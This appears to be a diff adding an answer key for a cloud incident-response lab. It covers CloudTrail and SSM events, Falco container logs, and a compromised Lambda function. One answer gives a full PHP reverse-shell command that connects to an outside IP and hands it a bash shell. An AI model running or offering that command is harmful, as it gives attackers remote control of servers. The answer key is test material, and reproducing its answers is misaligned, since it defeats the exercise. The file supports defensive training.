@@ -1,0 +1,47 @@
+Which CloudTrail events can you use to track SSM commands and sessions?
+SendCommand, StartSession
+Which AWS service adjusts the right number of EC2 instances to match demand?
+Amazon EC2 Auto Scaling
+
+When was Morgan Blake's local password changed?
+2026-01-14 23:44:19
+What GitHub repository name did Morgan clone to the VM?
+react-boilerplate
+What rule has triggered the alert you see?
+Search Private Keys or Passwords
+
+Does an EC2 instance have access to the events of its containers? (Yea/Nay)
+Yea
+Is Initial Access to containers similar to that of plain EC2? (Yea/Nay)
+Yea
+
+Which two containers are visible in Falco logs?
+thm-db, thm-web
+What container image does the web container use?
+thm/website:latest
+What is the absolute path to the Apache web server?
+/usr/sbin/apache2
+What was the first Discovery command executed through the web?
+whoami
+What command line allowed the attacker to open a reverse shell?
+php -r $sock=fsockopen("115.190.98.228",9999);exec("bash <&3 >&3 2>&3");
+
+What role was assigned to the function during its creation?
+img-processor-role-ztpjz457
+What is the function's codeSha256 after the change in its code?
+JM6U2MB9wb7p738MMZzcISed6lXCRm0GNHS0eK0UpZQ=
+What is the name of the new execution role?
+ImageProcessorRole
+What CloudTrail event confirms this misconfiguration?
+AddPermission20150331v2
+
+What user and access key interacted with the Lambda service?
+carl.brown, AKIAVZZK4G6EZH7GIZY3
+What is the size of the uploaded Python code?
+1837
+What are their instance IDs? (Ascending, via comma)
+i-054e705408f5fa5de, i-056219235e66e3f94
+What SSM "documentName" did the attacker use to install malware?
+AWS-RunShellScript
+Which user-agent was used by Lambda to run the malicious code?
+Boto3/1.40.4
